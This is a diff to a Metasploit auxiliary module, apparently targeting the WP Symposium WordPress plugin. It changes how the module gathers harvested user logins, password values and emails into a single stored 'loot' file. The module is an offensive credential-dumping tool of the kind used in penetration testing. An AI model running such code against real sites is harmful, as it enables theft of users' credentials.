@@ -85,6 +85,8 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status("#{peer} - Last user-id is '#{last_id}'")
     end
 
+    credentials = ""
+
     vprint_status("#{peer} - Trying to retrieve the users informations...")
     for user_id in first_id..last_id
       separator = Rex::Text.rand_text_numeric(7,bad='0')
@@ -102,9 +104,13 @@ class MetasploitModule < Msf::Auxiliary
 
         print_good("#{peer} - #{sprintf("%-15s %-34s %s", user_login, user_pass, user_email)}")
 
-        loot = store_loot("wp_symposium.http","text/plain", rhost, "#{user_login},#{user_pass},#{user_email}")
-        vprint_status("Credentials saved in: #{loot}")
+        credentials << "#{user_login},#{user_pass},#{user_email}\n"
       end
+    end
+
+    if not credentials.empty?
+      loot = store_loot("wp_symposium.http","text/plain", rhost, credentials)
+      vprint_status("Credentials saved in: #{loot}")
     end
   end
 end
